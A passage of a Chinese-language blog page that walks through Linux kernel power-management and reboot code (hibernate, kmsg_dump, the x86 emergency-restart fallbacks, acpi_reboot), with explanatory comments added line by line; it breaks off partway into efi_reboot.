Restore_console:<br>pm_restore_console();<span class="hljs-comment">//在系统挂起或休眠操作后恢复控制台状态。</span><br><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br> Unlock:<br>mutex_unlock(&amp;kexec_mutex);<span class="hljs-comment">//释放互斥量</span><br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="mutex-unlock"><a href="#mutex-unlock" class="headerlink" title="mutex_unlock()"></a>mutex_unlock()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __sched <span class="hljs-title function_">mutex_unlock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *lock)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_DEBUG_LOCK_ALLOC</span><br><span class="hljs-keyword">if</span> (__mutex_unlock_fast(lock))<br><span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>__mutex_unlock_slowpath(lock, _RET_IP_);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hibernate"><a href="#hibernate" class="headerlink" title="hibernate()"></a>hibernate()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * hibernate - Carry out system hibernation, including saving the image.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//电源休眠</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">hibernate</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> error, nr_calls = <span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> snapshot_test = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">//检查系统是否可以休眠，如果不是则返回错误</span><br><span class="hljs-keyword">if</span> (!hibernation_available()) &#123;<br>pm_pr_dbg(<span class="hljs-string">&quot;Hibernation not available.\n&quot;</span>);<br><span class="hljs-keyword">return</span> -EPERM;<br>&#125;<br><br>lock_system_sleep();<br><span class="hljs-comment">/* The snapshot device should not be opened while we&#x27;re running */</span><br><span class="hljs-keyword">if</span> (!atomic_add_unless(&amp;snapshot_device_available, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>)) &#123;<br>error = -EBUSY;<br><span class="hljs-keyword">goto</span> Unlock;<br>&#125;<br><br>    <span class="hljs-comment">//调用 PM_HIBERNATION_PREPARE 通知程序链，让设备和其他子进程准备休眠。</span><br>pr_info(<span class="hljs-string">&quot;hibernation entry\n&quot;</span>);<br>pm_prepare_console();<br>error = __pm_notifier_call_chain(PM_HIBERNATION_PREPARE, <span class="hljs-number">-1</span>, &amp;nr_calls);<br><span class="hljs-keyword">if</span> (error) &#123;<br>nr_calls--;<br><span class="hljs-keyword">goto</span> Exit;<br>&#125;<br><br>ksys_sync_helper();<br><span class="hljs-comment">//调用 freeze_processes() 来冻结系统上的所有进程</span><br>error = freeze_processes();<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> Exit;<br><br>    <span class="hljs-comment">//锁定设备热插拔互斥锁以防止任何进一步的设备热插拔操作。（从正在运行的系统中添加或删除 CPU 的能力）</span><br>lock_device_hotplug();<br><span class="hljs-comment">/* Allocate memory management structures */</span><br>    <span class="hljs-comment">//分配内存管理结构并获取系统内存的快照，将其保存到文件或设备中。</span><br>error = create_basic_memory_bitmaps();<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">goto</span> Thaw;<br><span class="hljs-comment">//调用 hibernation_snapshot() 来创建系统当前状态的快照</span><br>error = hibernation_snapshot(hibernation_mode == HIBERNATION_PLATFORM);<br><span class="hljs-keyword">if</span> (error || freezer_test_done)<br><span class="hljs-keyword">goto</span> Free_bitmaps;<br><br>    <span class="hljs-comment">//如果系统正在挂起，该函数使用 swsusp_write() 将快照映像写入磁盘并关闭系统。</span><br><span class="hljs-keyword">if</span> (in_suspend) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (hibernation_mode == HIBERNATION_PLATFORM)<br>flags |= SF_PLATFORM_MODE;<br><span class="hljs-keyword">if</span> (nocompress)<br>flags |= SF_NOCOMPRESS_MODE;<br><span class="hljs-keyword">else</span><br>        flags |= SF_CRC32_MODE;<br><br>pm_pr_dbg(<span class="hljs-string">&quot;Writing image.\n&quot;</span>);<br>error = swsusp_write(flags);<br>swsusp_free();<br><span class="hljs-keyword">if</span> (!error) &#123;<br><span class="hljs-keyword">if</span> (hibernation_mode == HIBERNATION_TEST_RESUME)<br>snapshot_test = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">else</span><br>power_down();<br>&#125;<br>in_suspend = <span class="hljs-number">0</span>;<br>pm_restore_gfp_mask();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>pm_pr_dbg(<span class="hljs-string">&quot;Image restored successfully.\n&quot;</span>);<br>&#125;<br><br> Free_bitmaps:<br>free_basic_memory_bitmaps();<br> Thaw:<br>unlock_device_hotplug();<br>    <span class="hljs-comment">//如果系统正在恢复，该函数使用 load_image_and_restore() 从快照映像恢复系统。</span><br><span class="hljs-keyword">if</span> (snapshot_test) &#123;<br>pm_pr_dbg(<span class="hljs-string">&quot;Checking hibernation image\n&quot;</span>);<br>error = swsusp_check();<br><span class="hljs-keyword">if</span> (!error)<br>error = load_image_and_restore();<br>&#125;<br>thaw_processes();<br><br><span class="hljs-comment">/* Don&#x27;t bother checking whether freezer_test_done is true */</span><br>    <span class="hljs-comment">//释放内存管理结构、解冻进程并向所有已注册的通知程序发送 PM_POST_HIBERNATION 通知来进行清理。</span><br>freezer_test_done = <span class="hljs-literal">false</span>;<br> Exit:<br>__pm_notifier_call_chain(PM_POST_HIBERNATION, nr_calls, <span class="hljs-literal">NULL</span>);<br>pm_restore_console();<br><span class="hljs-type">atomic_inc</span>(&amp;snapshot_device_available);<br> Unlock:<br>    <span class="hljs-comment">//释放系统睡眠锁并返回。</span><br>unlock_system_sleep();<br>pr_info(<span class="hljs-string">&quot;hibernation exit\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="emergency-restart"><a href="#emergency-restart" class="headerlink" title="emergency_restart()"></a>emergency_restart()</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>  <span class="hljs-title function_">emergency_restart</span> <span class="hljs-params">( <span class="hljs-type">void</span> )</span> <br>&#123; <br>    <span class="hljs-comment">//kmsg_dump 是一个函数，用于将内核日志缓冲区转储到控制台或持久存储设备。</span><br>    <span class="hljs-comment">//KMSG_DUMP_EMERG 宏作为参数传递，表示由于紧急情况正在转储日志。</span><br>kmsg_dump ( KMSG_DUMP_EMERG ); <br>    <span class="hljs-comment">//启动系统的紧急重启</span><br>machine_emergency_restart (); <br>&#125; <br></code></pre></td></tr></table></figure><h3 id="kmsg-dump"><a href="#kmsg-dump" class="headerlink" title="kmsg_dump()"></a>kmsg_dump()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kmsg_dump</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> kmsg_dump_reason reason)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmsg_dumper</span> *<span class="hljs-title">dumper</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>    <span class="hljs-comment">//检查指定的原因是否越界以及是否设置了 always_kmsg_dump 标志。</span><br>    <span class="hljs-comment">//always_kmsg_dump的值可以设置为 1 以允许在所有情况下转储内核日志缓冲区，或者设置为 0 以禁用内核日志缓冲区的转储</span><br><span class="hljs-keyword">if</span> ((reason &gt; KMSG_DUMP_OOPS) &amp;&amp; !always_kmsg_dump)<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">//在使用 RCU（读取-复制更新）同步的程序中获取读取端临界区，防止并发访问和修改</span><br>rcu_read_lock();<br>    <span class="hljs-comment">//遍历已注册的“转储器”结构列表</span><br>list_for_each_entry_rcu(dumper, &amp;dump_list, <span class="hljs-built_in">list</span>) &#123;<br><span class="hljs-keyword">if</span> (dumper-&gt;max_reason &amp;&amp; reason &gt; dumper-&gt;max_reason)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/* initialize iterator with data about the stored records */</span><br>dumper-&gt;active = <span class="hljs-literal">true</span>;<br><span class="hljs-comment">//初始化迭代器</span><br>logbuf_lock_irqsave(flags);<br>dumper-&gt;cur_seq = clear_seq;<br>dumper-&gt;cur_idx = clear_idx;<br>dumper-&gt;next_seq = log_next_seq;<br>dumper-&gt;next_idx = log_next_idx;<br>logbuf_unlock_irqrestore(flags);<br><br>        <br><span class="hljs-comment">/* invoke dumper which will iterate over records */</span><br>        <span class="hljs-comment">//调用转储器</span><br>dumper-&gt;dump(dumper, reason);<br><br><span class="hljs-comment">/* reset iterator */</span><br>dumper-&gt;active = <span class="hljs-literal">false</span>;<br>&#125;<br>rcu_read_unlock();<span class="hljs-comment">//关闭RCU临界区</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="machine-emergency-restart"><a href="#machine-emergency-restart" class="headerlink" title="machine_emergency_restart()"></a>machine_emergency_restart()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">machine_emergency_restart</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>__machine_emergency_restart(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">//int emergency：紧急情况的类型</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __machine_emergency_restart(<span class="hljs-type">int</span> emergency)<br>&#123;<br>    <span class="hljs-comment">//设置reboot状态</span><br>reboot_emergency = emergency;<br>    <span class="hljs-comment">//调用 machine_ops 结构的 emergency_restart 函数，这是一个特定于平台的结构，包含指向内核需要执行的各种特定于硬件的操作的函数指针。 emergency_restart 函数负责启动实际的重启过程，这可能涉及关闭系统、重置硬件组件或执行其他特定于平台的操作。</span><br>machine_ops.emergency_restart();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="machine-ops-1"><a href="#machine-ops-1" class="headerlink" title="machine_ops()"></a>machine_ops()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//指向内核需要执行的各种特定于硬件的操作的函数指针。</span><br><span class="hljs-comment">//是从独立代码进入x86硬件的入口指针</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">machine_ops</span> &#123;</span><br><span class="hljs-type">void</span> (*restart)(<span class="hljs-type">char</span> *cmd);<br><span class="hljs-type">void</span> (*halt)(<span class="hljs-type">void</span>);<br><span class="hljs-type">void</span> (*power_off)(<span class="hljs-type">void</span>);<br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-type">void</span>);<br><span class="hljs-type">void</span> (*crash_shutdown)(<span class="hljs-keyword">struct</span> pt_regs *);<br><span class="hljs-type">void</span> (*emergency_restart)(<span class="hljs-type">void</span>);<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">machine_ops</span> <span class="hljs-title">machine_ops</span> __<span class="hljs-title">ro_after_init</span> =</span> &#123;<br>.power_off = native_machine_power_off,<br>.shutdown = native_machine_shutdown,<br>.emergency_restart = native_machine_emergency_restart,<br>.restart = native_machine_restart,<br>.halt = native_machine_halt,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEXEC_CORE</span><br>.crash_shutdown = native_machine_crash_shutdown,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="native-machine-emergency-restart"><a href="#native-machine-emergency-restart" class="headerlink" title="native_machine_emergency_restart()"></a>native_machine_emergency_restart()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">native_machine_emergency_restart</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> attempt = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> orig_reboot_type = reboot_type;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> mode;<br><br>    <span class="hljs-comment">//禁用系统中的所有虚拟机扩展（vmx）</span><br><span class="hljs-keyword">if</span> (reboot_emergency)<br>emergency_vmx_disable_all();<br><br>    <span class="hljs-comment">//trust boot重启</span><br>tboot_shutdown(TB_SHUTDOWN_REBOOT);<br><br><span class="hljs-comment">/* Tell the BIOS if we want cold or warm reboot */</span><br>    <span class="hljs-comment">//重启方式</span><br>mode = reboot_mode == REBOOT_WARM ? <span class="hljs-number">0x1234</span> : <span class="hljs-number">0</span>;<br>*((<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *)__va(<span class="hljs-number">0x472</span>)) = mode;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If an EFI capsule has been registered with the firmware then</span><br><span class="hljs-comment"> * override the reboot= parameter.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//检查可扩展固件接口 (EFI) 封装是否已在固件中注册，如果已注册，则强制系统使用 EFI 引导过程重新引导。</span><br>    <span class="hljs-comment">//EFI capsule 是一种数据结构，包含固件更新或其他可以在引导过程中传递给系统固件的信息。</span><br><span class="hljs-keyword">if</span> (efi_capsule_pending(<span class="hljs-literal">NULL</span>)) &#123;<br>pr_info(<span class="hljs-string">&quot;EFI capsule is pending, forcing EFI reboot.\n&quot;</span>);<br>reboot_type = BOOT_EFI;<br>&#125;<br><br>    <span class="hljs-comment">//reboot_type通常在其他函数中设定，如reboot_setup中等</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-comment">/* Could also try the reset bit in the Hammer NB */</span><br><span class="hljs-keyword">switch</span> (reboot_type) &#123;<br>                <br>        <span class="hljs-comment">//BOOT_ACPI：指示系统应尝试使用高级配置和电源接口 (ACPI) 标准重新启动。 </span><br><span class="hljs-keyword">case</span> BOOT_ACPI:<br>acpi_reboot();<br>reboot_type = BOOT_KBD;<br><span class="hljs-keyword">break</span>;<br>                <br><span class="hljs-comment">//BOOT_KBD：表示系统应该尝试使用键盘控制器对复位线发出脉冲来重新启动。</span><br><span class="hljs-keyword">case</span> BOOT_KBD:<br>mach_reboot_fixups(); <span class="hljs-comment">/* For board specific fixups */</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>kb_wait();<br>udelay(<span class="hljs-number">50</span>);<br>outb(<span class="hljs-number">0xfe</span>, <span class="hljs-number">0x64</span>); <span class="hljs-comment">/* Pulse reset low */</span><br>udelay(<span class="hljs-number">50</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (attempt == <span class="hljs-number">0</span> &amp;&amp; orig_reboot_type == BOOT_ACPI) &#123;<br>attempt = <span class="hljs-number">1</span>;<br>reboot_type = BOOT_ACPI;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>reboot_type = BOOT_EFI;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">//BOOT_EFI：指示系统应尝试使用可扩展固件接口 (EFI) 引导过程重新引导。</span><br><span class="hljs-keyword">case</span> BOOT_EFI:<br>efi_reboot(reboot_mode, <span class="hljs-literal">NULL</span>);<br>reboot_type = BOOT_BIOS;<br><span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">//BOOT_BIOS：指示系统应尝试使用 BIOS 引导过程重新引导。</span><br><span class="hljs-keyword">case</span> BOOT_BIOS:<br>machine_real_restart(MRR_BIOS);<br><br><span class="hljs-comment">/* We&#x27;re probably dead after this, but... */</span><br>reboot_type = BOOT_CF9_SAFE;<br><span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">//BOOT_CF9_FORCE：表示系统应该尝试通过写入 0xcf9 端口并强制重置来重启。</span><br><span class="hljs-keyword">case</span> BOOT_CF9_FORCE:<br>port_cf9_safe = <span class="hljs-literal">true</span>;<br><span class="hljs-comment">/* Fall through */</span><br><br>        <span class="hljs-comment">//BOOT_CF9_SAFE：表示系统应该尝试通过写入 0xcf9 端口来重启，但前提是这样做是安全的。</span><br><span class="hljs-keyword">case</span> BOOT_CF9_SAFE:<br><span class="hljs-keyword">if</span> (port_cf9_safe) &#123;<br>u8 reboot_code = reboot_mode == REBOOT_WARM ?  <span class="hljs-number">0x06</span> : <span class="hljs-number">0x0E</span>;<br>u8 cf9 = inb(<span class="hljs-number">0xcf9</span>) &amp; ~reboot_code;<br>outb(cf9|<span class="hljs-number">2</span>, <span class="hljs-number">0xcf9</span>); <span class="hljs-comment">/* Request hard reset */</span><br>udelay(<span class="hljs-number">50</span>);<br><span class="hljs-comment">/* Actually do the reset */</span><br>outb(cf9|reboot_code, <span class="hljs-number">0xcf9</span>);<br>udelay(<span class="hljs-number">50</span>);<br>&#125;<br>reboot_type = BOOT_TRIPLE;<br><span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">//BOOT_TRIPLE：表示系统应该尝试通过生成三重故障来重启</span><br><span class="hljs-keyword">case</span> BOOT_TRIPLE:<br>idt_invalidate(<span class="hljs-literal">NULL</span>);<br>__asm__ __volatile__(<span class="hljs-string">&quot;int3&quot;</span>);<br><br><span class="hljs-comment">/* We&#x27;re probably dead after this, but... */</span><br>reboot_type = BOOT_KBD;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="acpi-reboot"><a href="#acpi-reboot" class="headerlink" title="acpi_reboot()"></a>acpi_reboot()</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//用ACPI方式重启</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">acpi_reboot</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">acpi_generic_address</span> *<span class="hljs-title">rr</span>;</span><br>u8 reset_value;<br>    <br><span class="hljs-comment">//检查系统是否禁用了 ACPI</span><br><span class="hljs-keyword">if</span> (acpi_disabled)<br><span class="hljs-keyword">return</span>;<br><br>rr = &amp;acpi_gbl_FADT.reset_register;<br><br><span class="hljs-comment">/* ACPI reset register was only introduced with v2 of the FADT */</span><br><br>    <span class="hljs-comment">// FADT 中的 header.revision 字段指定了表的版本。如果 header.revision 字段小于 2，则意味着 reset_register 字段不存在于 FADT 中，因此不能用于重置系统。</span><br><span class="hljs-keyword">if</span> (acpi_gbl_FADT.header.revision &lt; <span class="hljs-number">2</span>)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">/* Is the reset register supported? The spec says we should be</span><br><span class="hljs-comment"> * checking the bit width and bit offset, but Windows ignores</span><br><span class="hljs-comment"> * these fields */</span><br>    <span class="hljs-comment">//检索指向 ACPI 重置寄存器的指针并检查它是否受支持</span><br><span class="hljs-keyword">if</span> (!(acpi_gbl_FADT.flags &amp; ACPI_FADT_RESET_REGISTER))<br><span class="hljs-keyword">return</span>;<br><br>reset_value = acpi_gbl_FADT.reset_value;<br><br>    <span class="hljs-comment">//确定重置寄存器的类型（I/O、内存或 PCI 配置空间）并调用适当的函数来启动重启。</span><br><span class="hljs-comment">/* The reset register can only exist in I/O, Memory or PCI config space</span><br><span class="hljs-comment"> * on a device on bus 0. */</span><br>    <span class="hljs-comment">//如果重置寄存器位于 PCI 配置空间中，则该函数会调用 acpi_pci_reboot() 函数来启动重启。</span><br><span class="hljs-keyword">switch</span> (rr-&gt;space_id) &#123;<br><span class="hljs-keyword">case</span> ACPI_ADR_SPACE_PCI_CONFIG:<br>acpi_pci_reboot(rr, reset_value);<br><span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">//如果重置寄存器在系统内存或 I/O 空间中，则该函数调用 acpi_reset() 函数来启动重启。</span><br><span class="hljs-keyword">case</span> ACPI_ADR_SPACE_SYSTEM_MEMORY:<br><span class="hljs-keyword">case</span> ACPI_ADR_SPACE_SYSTEM_IO:<br>printk(KERN_DEBUG <span class="hljs-string">&quot;ACPI MEMORY or I/O RESET_REG.\n&quot;</span>);<br>acpi_reset();<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="efi-reboot"><a href="#efi-reboot" class="headerlink" title="efi_reboot()"></a>efi_reboot()</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//efi_reboot() 函数用于使用可扩展固件接口 (EFI) 标准启动系统重启。 EFI 是一种规范，它定义了一组接口和协议，可用于与计算机系统的固件进行交互。</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">efi_reboot</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> reboot_mode reboot_mode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__unused)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *str[] = &#123; <span 